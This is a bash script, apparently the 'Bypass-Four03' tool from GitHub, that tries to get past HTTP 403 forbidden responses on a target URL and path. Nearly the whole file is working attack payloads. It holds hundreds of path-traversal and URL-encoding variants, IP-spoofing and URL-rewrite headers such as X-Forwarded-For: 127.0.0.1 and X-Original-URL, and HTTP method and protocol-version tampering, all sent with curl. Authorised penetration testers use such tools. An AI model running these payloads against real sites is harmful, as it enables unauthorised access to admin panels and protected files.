#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[1;32m'
BLUE='\033[0;34m'
WHITE='\033[1;97m'
YELLOW='\033[1;33m'
RESET='\033[0m'
VIOLET='\033[38;2;138;43;226m'
ORANGE='\033[38;2;255;165;0m'
INDIGO='\033[38;2;75;0;130m'
LIGHT_VIOLET='\033[38;2;186;85;211m'
MAGENTA_CUSTOM='\033[38;2;217;7;210m'  # Custom Magenta #d907d2

# Help menu
if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    echo -e "${GREEN}Usage: ./bypass-Four03.sh [URL] [path]"
    echo -e "Example: ./bypass-Four03.sh https://example.com admin\n"
    echo -e "Example: ./bypass-Four03.sh https://example.com admin/index.php\n"
    echo -e "Example: ./bypass-Four03.sh https://example.com server-status\n"
    echo -e "${CYAN}Options:${WHITE}"
    echo -e "  -h, --help    Show this help menu"
    echo -e "\nThis tool attempts to bypass HTTP 403 forbidden errors using various path and header manipulation techniques."
    exit 0
fi



echo -e "${ORANGE}"
figlet -f slant Bypass-Four03
echo -e "${WHITE}"
echo "                                                     By nazmul__ethi"
echo -e "                                                     ${GREEN}https://github.com/nazmul-ethi/Bypass-Four03${RESET}"
echo ""
echo "./bypass-Four03.sh $1 $2"
echo " "



# Function to colorize HTTP status codes
colorize_status_code() {
    http_code=$1
    # Apply color based on HTTP status code
    if [[ "$http_code" == "200" ]]; then
        echo -e "${ORANGE}${http_code}${RESET}"
    elif [[ "$http_code" == "403" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    elif [[ "$http_code" == "405" ]]; then
        echo -e "${YELLOW}${http_code}${RESET}"
    elif [[ "$http_code" == "404" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    elif [[ "$http_code" == "500" ]]; then
        echo -e "${VIOLET}${http_code}${RESET}"
    elif [[ "$http_code" == "400" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    else
        echo -e "${YELLOW}${http_code}${RESET}"
    fi
}



# Path Fuzzing
echo -e "${MAGENTA_CUSTOM}PATH FUZZING${RESET}"
echo ""
fuzz_paths=("$1/$2"
"$1/$2/../"
"$1/$2/.."
"$1/../$2"
"$1/../$2/../"
"$1//$2//"
"$1//$2"
"$1/$2//"
"$1.$2"
"$1./$2"
"$1/./$2"
"$1/./$2/."
"$1/./$2./"
"$1/$2/./"
"$1/$2/."
"$1/$2."
"$1/$2/../../"
"$1/../../$2/../../"
"$1/../../$2"
"$1/$2/../../../"
"$1/../../../$2"
"$1/$2/../../..//"
"$1/../../..//$2"
"$1/$2/../..//"
"$1/../..//$2"
"$1/$2/../..//../"
"$1/../..//../$2"
"$1;$2"
"$1;/$2"
"$1/;/$2"
"$1/;/$2/;"
"$1/;/$2;/"
"$1/$2/;/"
"$1/$2/;"
"$1..;$2"
"$1..;/$2"
"$1/..;/$2"
"$1/..;/$2/..;"
"$1/..;/$2..;/"
"$1/$2/..;/"
"$1/$2/..;"
"$1/$2/../..;/"
"$1/../..;/$2"
"$1/$2/.././../"
"$1/.././../$2"
"$1/$2/../.;/../"
"$1/../.;/../$2"
"$1/$2/..//../"
"$1/..//../$2"
"$1/$2/..//..;/"
"$1/..//..;/$2"
"$1/$2/..;//..;/"
"$1/..;//..;/$2"
"$1/$2//.."
"$1/$2//../../"
"$1/$2//..;"
"$1/$2/%00"
"$1/$2%00"
"$1/%00/$2"
"$1/%00/$2/%00"
"$1/$2/..%00/;"
"$1/..%00/;$2"
"$1/$2/..%00;/"
"$1/$2/..;%00/"
"$1%00$2"
"$1;%09..$2"
"$1;%09../$2"
"$1/;%09../$2"
"$1/;%09../$2/;%09.."
"$1/;%09../$2;%09../"
"$1/$2/;%09../"
"$1/$2/;%09.."
"$1%09$2"
"$1%09/$2"
"$1/%09/$2"
"$1/%09/$2/%09"
"$1/%09/$2%09/"
"$1/$2/%09/"
"$1/$2/%09"
"$1/$2%09"
"$1;%2f..$2"
"$1;%2f../$2"
"$1/;%2f../$2"
"$1/;%2f../$2/;%2f.."
"$1/;%2f../$2;%2f../"
"$1/$2/;%2f../"
"$1/$2/;%2f.."
"$1;%09..;$2"
"$1;%09..;/$2"
"$1/;%09..;/$2"
"$1/;%09..;/$2/;%09..;"
"$1/;%09..;/$2;%09..;/"
"$1/$2/;%09..;/"
"$1/$2/;%09..;"
"$1/$2/%09.."
"$1;%09$2"
"$1;%09/$2"
"$1/;%09/$2"
"$1/;%09/$2/;%09"
"$1/;%09/$2;%09/"
"$1/$2/;%09/"
"$1/$2/;%09"
"$1/$2;%09"
"$1/$2/..%09"
"$1/..%09/$2"
"$1/$2%09%3b"
"$1/%09%3b/$2"
"$1/$2%09%3b"
"$1/$2/%0d"
"$1/$2%0d"
"$1/%0d/$2"
"$1/%0d/$2/%0d"
"$1/$2..%0d/;"
"$1/..%0d/;/$2"
"$1/$2/..%0d;/"
"$1/$2/..;%0d/"
"$1%0d$2"
"$1%20$2"
"$1%20/$2"
"$1/%20/$2"
"$1/%20/$2/%20"
"$1/%20/$2%20/"
"$1/$2/%20/"
"$1/$2/%20"
"$1/$2%20"
"$1/$2/%20#"
"$1/$2/%20%23"
"$1%23$2"
"$1%23/$2"
"$1/%23/$2"
"$1/%23/$2/%23"
"$1/%23/$2%23/"
"$1/$2/%23/"
"$1/$2/%23"
"$1/$2%23"
"$1/$2/%23%3f"
"$1/$2%23%3f"
"$1/%23%3f/$2"
"$1/$2%252e**"
"$1/$2%252e/"
"$1/$2/%252e%252e%252f/"
"$1/$2/%252e%252e%253b/"
"$1/%252e%252e%253b/$2/%252e%252e%253b/"
"$1/$2%252f/"
"$1/$2/%252f"
"$1/$2%252f%252f"
"$1/%252f%252f/$2"
"$1/$2%2f%2e%2e"
"$1%2e$2"
"$1%2e/$2"
"$1/%2e/$2"
"$1/%2e/$2/%2e"
"$1/%2e/$2%2e/"
"$1/$2/%2e/"
"$1/$2/%2e"
"$1/$2%2e"
"$1/$2%2e%2e"
"$1/$2%2e%2e%2f"
"$1/%2e%2e/$2"
"$1/$2/%2e//"
"$1/%2e//$2"
"$1/$2/%2e%2e/"
"$1/%2e%2e%3b/$2%2e%2e%3b"
"$1/$2/%2e%2f/"
"$1/%2e%2f/$2"
"$1%2f$2"
"$1%2f/$2"
"$1/%2f/$2"
"$1/%2f/$2/%2f"
"$1/%2f/$2%2f/"
"$1/$2/%2f/"
"$1/$2/%2f"
"$1/$2%2f"
"$1/$2/..%2f"
"$1/..%2f/$2"
"$1/..%2f/$2/..%2f/"
"$1/$2/..;%2f"
"$1/$2%2f%23"
"$1/$2/%2f%23"
"$1/%2f%23/$2"
"$1/%2f../$2"
"$1/%2f../$2/%2f../"
"$1/$2%2f.."
"$1%2F$2"
"$1/..%2f..%2f/$2"
"$1/..%2f..%2f/$2/..%2f..%2f/"
"$1/$2/..%2f..%2f"
"$1/$2/..;%2f..;%2f"
"$1/$2/..%2f..%2f..%2f"
"$1/..%2f..%2f..%2f/$2"
"$1/$2/..;%2f..;%2f..;%2f"
"$1/$2%3b"
"$1/%3b/$2"
"$1/%3b/$2/%3b/"
"$1/$2/%3b"
"$1%3b$2"
"$1/%3b/../$2"
"$1/$2/%3b/.."
"$1/$2%3b%09"
"$1/%3b/%2e./$2"
"$1/$2%3b/%2e."
"$1/$2/%3b/%2e."
"$1/$2%3b//%2f../"
"$1/%3b//%2f../$2%3b//%2f../"
"$1/$2%3b/%2f%2f../"
"$1/$2%ef%bc%8f"
"$1/$2/%3f%23"
"$1/%3f%23/$2/%3f%23"
"$1/..%5c/$2"
"$1/$2/..%5c/"
"$1/$2/..%ff/;"
"$1/..%ff/;/$2"
"$1/$2%ff"
"$1*$2"
"$1*/$2"
"$1/*/$2"
"$1/*/$2/*"
"$1/*/$2*/"
"$1/$2/*/"
"$1/$2/*"
"$1/$2*"
"$1/**/$2/**"
"$1/**$2/**"
"$1/**/$2*/"
"$1/$2#"
"$1/$2#Four03"
"$1/#Four03$2"
"$1/#$2"
"$1/$2.asp"
"$1/$2.aspx"
"$1/$2.server-status"
"$1/$2server-status"
"$1/$2.bak"
"$1/$2.config"
"$1/$2.db"
"$1/$2.env"
"$1/$2.html"
"$1/$2.json"
"$1/$2.jsp"
"$1/$2.php"
"$1/$2.sql"
"$1/$2.txt"
"$1/$2.zip"
"$1/$2.xml"
"$1/$2.log"
"$1/$2.old"
)

for path in "${fuzz_paths[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$path")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${path}  Response: [${colorized_code}] Size: ${size}"
done





# Header Fuzzing
echo ""
echo -e "${MAGENTA_CUSTOM}HEADER FUZZING${RESET}"
echo ""
fuzz_headers=(
	"-H 'X-Forwarded-For: localhost'"
	"-H 'X-Forwarded-For: localhost:80'"
	"-H 'X-Forwarded-For: localhost:443'"
	"-H 'X-Forwarded-For: 127.0.0.1'"
	"-H 'X-Forwarded-For: 127.0.0.1:80'"
	"-H 'X-Forwarded-For: 127.0.0.1:443'"
	"-H 'X-Forwarded-For: 2130706433'"
	"-H 'X-Forwarded-For: 0x7F000001'"
	"-H 'X-Forwarded-For: 0177.0000.0000.0001'"
	"-H 'X-Forwarded-For: 0'"
	"-H 'X-Forwarded-For: 127.1'"
	"-H 'X-Forwarded-For: 10.0.0.0'"
	"-H 'X-Forwarded-For: 10.0.0.1'"
	"-H 'X-Forwarded-For: 172.16.0.0'"
	"-H 'X-Forwarded-For: 172.16.0.1'"
	"-H 'X-Forwarded-For: 192.168.1.0'"
	"-H 'X-Forwarded-For: 192.168.1.1'"
	"-H 'X-Forwarded-Port: 443'"
	"-H 'X-Forwarded-Port: 443'"
	"-H 'X-Forwarded-Port: 4443'"
	"-H 'X-Forwarded-Port: 4443'"
	"-H 'X-Forwarded-Port: 80'"
	"-H 'X-Forwarded-Port: 8080'"
	"-H 'X-Forwarded-Port: 8443'"
	"-H 'X-Forwarded-Port: 8443'"
	"-H 'Allow: GET'"
	"-H 'Allow: HEAD'"
	"-H 'Allow: POST'"
	"-H 'Allow: TRACE'"
	"-H 'Allow: CONNECT'"
	"-H 'X-Forwarded: localhost'"
	"-H 'X-Forwarded: localhost:80'"
	"-H 'X-Forwarded: localhost:443'"
	"-H 'X-Forwarded: 127.0.0.1'"
	"-H 'X-Forwarded: 127.0.0.1:80'"
	"-H 'X-Forwarded: 127.0.0.1:443'"
	"-H 'X-Forwarded: 2130706433'"
	"-H 'X-Forwarded: 0x7F000001'"
	"-H 'X-Forwarded: 0177.0000.0000.0001'"
	"-H 'X-Forwarded: 0'"
	"-H 'X-Forwarded: 127.1'"
	"-H 'X-Forwarded: 10.0.0.0'"
	"-H 'X-Forwarded: 10.0.0.1'"
	"-H 'X-Forwarded: 172.16.0.0'"
	"-H 'X-Forwarded: 172.16.0.1'"
	"-H 'X-Forwarded: 192.168.1.0'"
	"-H 'X-Forwarded: 192.168.1.1'"
	"-H 'X-Original-URL: $2'"
	"-H 'X-Rewrite-URL: $2'"
	"-H 'X-Original-URL: /admin/console'"
	"-H 'X-Rewrite-URL: /admin/console'"
	"-H 'X-Original-URL: /admin/'"
	"-H 'X-Rewrite-URL: /admin/'"
	"-H 'Content-Length: 0' '-X POST'"
	"-H 'Host: localhost'"
	"-H 'X-Host: localhost'"
	"-H 'X-Host: 127.0.0.1'"
	"-H 'X-ProxyUser-Ip: 127.0.0.1'"
	"-H 'X-Custom-IP-Authorization: localhost'"
	"-H 'X-Custom-IP-Authorization: localhost:80'"
	"-H 'X-Custom-IP-Authorization: localhost:443'"
	"-H 'X-Custom-IP-Authorization: 127.0.0.1'"
	"-H 'X-Custom-IP-Authorization: 127.0.0.1:80'"
	"-H 'X-Custom-IP-Authorization: 127.0.0.1:443'"
	"-H 'X-Custom-IP-Authorization: 2130706433'"
	"-H 'X-Custom-IP-Authorization: 0x7F000001'"
	"-H 'X-Custom-IP-Authorization: 0177.0000.0000.0001'"
	"-H 'X-Custom-IP-Authorization: 0'"
	"-H 'X-Custom-IP-Authorization: 127.1'"
	"-H 'X-Custom-IP-Authorization: 10.0.0.0'"
	"-H 'X-Custom-IP-Authorization: 10.0.0.1'"
	"-H 'X-Custom-IP-Authorization: 172.16.0.0'"
	"-H 'X-Custom-IP-Authorization: 172.16.0.1'"
	"-H 'X-Custom-IP-Authorization: 192.168.1.0'"
	"-H 'X-Custom-IP-Authorization: 192.168.1.1'"
	"-H 'X-Remote-IP: localhost'"
	"-H 'X-Remote-IP: localhost:80'"
	"-H 'X-Remote-IP: localhost:443'"
	"-H 'X-Remote-IP: 127.0.0.1'"
	"-H 'X-Remote-IP: 127.0.0.1:80'"
	"-H 'X-Remote-IP: 127.0.0.1:443'"
	"-H 'X-Remote-IP: 2130706433'"
	"-H 'X-Remote-IP: 0x7F000001'"
	"-H 'X-Remote-IP: 0177.0000.0000.0001'"
	"-H 'X-Remote-IP: 0'"
	"-H 'X-Remote-IP: 127.1'"
	"-H 'X-Remote-IP: 10.0.0.0'"
	"-H 'X-Remote-IP: 10.0.0.1'"
	"-H 'X-Remote-IP: 172.16.0.0'"
	"-H 'X-Remote-IP: 172.16.0.1'"
	"-H 'X-Remote-IP: 192.168.1.0'"
	"-H 'X-Remote-IP: 192.168.1.1'"
	"-H 'X-Originating-IP: localhost'"
	"-H 'X-Originating-IP: localhost:80'"
	"-H 'X-Originating-IP: localhost:443'"
	"-H 'X-Originating-IP: 127.0.0.1'"
	"-H 'X-Originating-IP: 127.0.0.1:80'"
	"-H 'X-Originating-IP: 127.0.0.1:443'"
	"-H 'X-Originating-IP: 2130706433'"
	"-H 'X-Originating-IP: 0x7F000001'"
	"-H 'X-Originating-IP: 0177.0000.0000.0001'"
	"-H 'X-Originating-IP: 0'"
	"-H 'X-Originating-IP: 127.1'"
	"-H 'X-Originating-IP: 10.0.0.0'"
	"-H 'X-Originating-IP: 10.0.0.1'"
	"-H 'X-Originating-IP: 172.16.0.0'"
	"-H 'X-Originating-IP: 172.16.0.1'"
	"-H 'X-Originating-IP: 192.168.1.0'"
	"-H 'X-Originating-IP: 192.168.1.1'"
	"-H 'X-Remote-Addr: localhost'"
	"-H 'X-Remote-Addr: localhost:80'"
	"-H 'X-Remote-Addr: localhost:443'"
	"-H 'X-Remote-Addr: 127.0.0.1'"
	"-H 'X-Remote-Addr: 127.0.0.1:80'"
	"-H 'X-Remote-Addr: 127.0.0.1:443'"
	"-H 'X-Remote-Addr: 2130706433'"
	"-H 'X-Remote-Addr: 0x7F000001'"
	"-H 'X-Remote-Addr: 0177.0000.0000.0001'"
	"-H 'X-Remote-Addr: 0'"
	"-H 'X-Remote-Addr: 127.1'"
	"-H 'X-Remote-Addr: 10.0.0.0'"
	"-H 'X-Remote-Addr: 10.0.0.1'"
	"-H 'X-Remote-Addr: 172.16.0.0'"
	"-H 'X-Remote-Addr: 172.16.0.1'"
	"-H 'X-Remote-Addr: 192.168.1.0'"
	"-H 'X-Remote-Addr: 192.168.1.1'"
	"-H 'X-Client-IP: localhost'"
	"-H 'X-Client-IP: localhost:80'"
	"-H 'X-Client-IP: localhost:443'"
	"-H 'X-Client-IP: 127.0.0.1'"
	"-H 'X-Client-IP: 127.0.0.1:80'"
	"-H 'X-Client-IP: 127.0.0.1:443'"
	"-H 'X-Client-IP: 2130706433'"
	"-H 'X-Client-IP: 0x7F000001'"
	"-H 'X-Client-IP: 0177.0000.0000.0001'"
	"-H 'X-Client-IP: 0'"
	"-H 'X-Client-IP: 127.1'"
	"-H 'X-Client-IP: 10.0.0.0'"
	"-H 'X-Client-IP: 10.0.0.1'"
	"-H 'X-Client-IP: 172.16.0.0'"
	"-H 'X-Client-IP: 172.16.0.1'"
	"-H 'X-Client-IP: 192.168.1.0'"
	"-H 'X-Client-IP: 192.168.1.1'"
	"-H 'X-Real-IP: localhost'"
	"-H 'X-Real-IP: localhost:80'"
	"-H 'X-Real-IP: localhost:443'"
	"-H 'X-Real-IP: 127.0.0.1'"
	"-H 'X-Real-IP: 127.0.0.1:80'"
	"-H 'X-Real-IP: 127.0.0.1:443'"
	"-H 'X-Real-IP: 2130706433'"
	"-H 'X-Real-IP: 0x7F000001'"
	"-H 'X-Real-IP: 0177.0000.0000.0001'"
	"-H 'X-Real-IP: 0'"
	"-H 'X-Real-IP: 127.1'"
	"-H 'X-Real-IP: 10.0.0.0'"
	"-H 'X-Real-IP: 10.0.0.1'"
	"-H 'X-Real-IP: 172.16.0.0'"
	"-H 'X-Real-IP: 172.16.0.1'"
	"-H 'X-Real-IP: 192.168.1.0'"
	"-H 'X-Real-IP: 192.168.1.1'"
	"-H 'Redirect: 127.0.0.1'"
	"-H 'Referer: 127.0.0.1'"
	"-H 'X-Forwarded-By: 127.0.0.1'"
	"-H 'X-Forwarded-Host: 127.0.0.1'"
	"-H 'X-HTTP-Method-Override: PUT'"
	"-H 'X-HTTP-Method-Override: POST'"
	"-H 'X-HTTP-Method-Override: TRACE'"
	"-H 'X-HTTP-Method-Override: HEAD'"
	"-H 'X-HTTP-Method-Override: PATCH'"
	"-H 'X-HTTP-Method-Override: CONNECT'"
)



for header in "${fuzz_headers[@]}"; do
    response=$(eval "curl -k -s -o /dev/null -iL -w '%{http_code},%{size_download}' $header $1/$2")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${1}/${2} ${header} Response: [${colorized_code}] Size: ${size}"
done





# HTTP Method Fuzzing
echo ""
echo -e "${MAGENTA_CUSTOM}HTTP METHOD FUZZING${RESET}"
echo ""
methods=("PUT" "POST" "CONNECT" "TRACE" "PATCH" "HEAD" "LOCK" "UPDATE" "TRACK" "OPTIONS" "DELETE") #You can also add HEAD METHOD here..
for method in "${methods[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X "$method" "$1/$2")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${1}/${2} -X $method Response: [${colorized_code}] Size: ${size}"
done



# HTTP Protocol Version Fuzzing
echo ""
echo -e "${MAGENTA_CUSTOM}HTTP PROTOCOL VERSION FUZZING${RESET}"
echo ""
versions=("0.9" "1.0" "1.1")
for version in "${versions[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$1/$2" --http"$version")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${1}/${2} with HTTP/$version Response: [${colorized_code}] Size: ${size}"
done



# Wayback Machine Check
echo ""
echo -e "${MAGENTA_CUSTOM}WAYBACK MACHINE CHECK${RESET}"
echo ""
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
